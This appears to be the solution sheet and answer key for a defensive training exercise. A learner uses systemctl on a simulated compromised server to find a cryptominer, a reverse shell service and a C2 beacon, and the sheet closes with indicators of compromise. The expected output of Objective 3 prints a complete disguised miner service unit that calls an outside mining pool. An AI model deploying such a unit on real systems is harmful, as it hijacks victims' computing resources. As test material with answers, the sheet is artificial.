# CLH-023: Service Management - Solution Sheet

**Module:** CLH-023
**Title:** Service Management
**Tier:** CLI Wraith
**Theme:** Analyze running services on a compromised server

---

## Scenario Overview

You are `analyst@COMPROMISED-SRV`, investigating a server with high CPU usage. Your mission is to enumerate running services, identify suspicious ones, and find the cryptominer's mining pool address.

---

## Objectives & Solutions

### Objective 1: LIST - Running Services
**Task:** Enumerate all running services on the system
**Hint:** `$ systemctl list-units --type=service`

**Solution:**
```bash
systemctl list-units --type=service
```

**Expected Output:**
```
UNIT                        LOAD   ACTIVE SUB     DESCRIPTION
sshd.service                loaded active running OpenSSH server daemon
nginx.service               loaded active running A high performance web server
mysql.service               loaded active running MySQL Community Server
cron.service                loaded active running Regular background program processing
xmrig.service               loaded active running XMRig Cryptocurrency Miner
reverse_shell.service       loaded active running Reverse Shell Service
beacon.timer                loaded active waiting Beacon Timer

7 loaded units listed.
```

**Analysis:** Three suspicious services identified: `xmrig.service` (cryptominer), `reverse_shell.service` (backdoor), and `beacon.timer` (C2 heartbeat).

---

### Objective 2: CHECK - Service Status
**Task:** View detailed status of a service
**Hint:** `$ systemctl status sshd`

**Solution:**
```bash
systemctl status sshd
```
or investigate the suspicious one:
```bash
systemctl status xmrig
```

**Expected Output (xmrig):**
```
● xmrig.service - XMRig Cryptocurrency Miner
   Loaded: loaded (/etc/systemd/system/xmrig.service; enabled)
   Active: active (running) since Mon 2026-01-10 02:30:00 UTC; 1 week ago
 Main PID: 6666 (xmrig)
    Tasks: 4 (limit: 4915)
   Memory: 86.4M
      CPU: 98.5%
   CGroup: /system.slice/xmrig.service
           └─6666 /opt/.hidden/xmrig --config=/opt/.hidden/config.json
```

**Analysis:** The xmrig service is consuming 98.5% CPU - classic cryptominer behavior.

---

### Objective 3: VIEW - Service Config
**Task:** View the service unit file contents
**Hint:** `$ systemctl cat sshd`

**Solution:**
```bash
systemctl cat xmrig
```

**Expected Output:**
```
# /etc/systemd/system/xmrig.service
[Unit]
Description=System Resource Monitor
After=network.target

[Service]
Type=simple
# Mining pool: stratum+tcp://darkpool.monero.net:3333
# Wallet: 48edfHu7V9Z84YzzMa6fUueoELZ9ZRXq9VetWzYGzKt52XU5xvqgzYnDK9URnRoJMk1j8nLAEo
ExecStart=/opt/.hidden/xmrig -o stratum+tcp://darkpool.monero.net:3333 -u 48edfHu7V9Z84YzzMa6fUueoELZ9ZRXq9VetWzYGzKt52XU5xvqgzYnDK9URnRoJMk1j8nLAEo -p x --donate-level=1
Restart=always
RestartSec=10
User=nobody

[Install]
WantedBy=multi-user.target
```

**Analysis:** This reveals the mining pool address `darkpool.monero.net:3333` and the attacker's Monero wallet address.

---

### Objective 4: FIND - Failed Services
**Task:** List any failed services
**Hint:** `$ systemctl --failed`

**Solution:**
```bash
systemctl --failed
```

**Expected Output:**
```
  UNIT                      LOAD   ACTIVE SUB    DESCRIPTION
● beacon.service           loaded failed failed Beacon C2 Service

1 loaded units listed.
```

**Analysis:** The beacon service failed - possibly killed by defender or crashed.

---

### Objective 5: LIST - Enabled Services
**Task:** List services enabled to start at boot
**Hint:** `$ systemctl list-unit-files --state=enabled`

**Solution:**
```bash
systemctl list-unit-files --state=enabled
```

**Expected Output:**
```
UNIT FILE                   STATE   VENDOR PRESET
sshd.service                enabled enabled
nginx.service               enabled enabled
mysql.service               enabled enabled
cron.service                enabled enabled
xmrig.service               enabled disabled
reverse_shell.service       enabled disabled

6 unit files listed.
```

**Analysis:** Both xmrig and reverse_shell are set to `enabled` despite vendor preset being `disabled` - indicates manual persistence setup by attacker.

---

## Insight Phase

**Question:** What is the mining pool address being used by the cryptominer? (format: domain:port)

**Answer:** `darkpool.monero.net:3333`

**Accepted variations:** "darkpool.monero.net:3333", "stratum+tcp://darkpool.monero.net:3333", "darkpool.monero.net"

**How to find:** Run `systemctl cat xmrig` and look for the `-o` parameter or the comment showing the mining pool.

---

## Key Findings Summary

| Service | Status | Notes |
|---------|--------|-------|
| sshd.service | LEGITIMATE | OpenSSH server |
| nginx.service | LEGITIMATE | Web server |
| mysql.service | LEGITIMATE | Database |
| cron.service | LEGITIMATE | Task scheduler |
| xmrig.service | **MALICIOUS** | Cryptominer - Mining Monero |
| reverse_shell.service | **MALICIOUS** | Backdoor to 10.0.0.88:4444 |
| beacon.timer | **MALICIOUS** | C2 heartbeat (failed) |

---

## Additional Investigation Commands

```bash
# Check the reverse shell service
systemctl cat reverse_shell

# View what services are suspicious in analysis notes
cat ~/analysis/suspicious.txt

# Check the baseline for comparison
cat ~/analysis/baseline.txt

# View the cheatsheet
cat ~/.systemctl_cheatsheet
```

---

## IOCs (Indicators of Compromise)

| IOC Type | Value |
|----------|-------|
| Service | xmrig.service |
| Service | reverse_shell.service |
| Service | beacon.timer |
| File Path | /opt/.hidden/xmrig |
| File Path | /opt/.hidden/config.json |
| Mining Pool | darkpool.monero.net:3333 |
| Wallet | 48edfHu7V9Z84YzzMa6fUueoELZ9ZRXq9VetWzYGzKt52XU5xvqgzYnDK9URnRoJMk1j8nLAEo |
| C2 Server | 10.0.0.88:4444 |

---

*Last Updated: February 2, 2026*
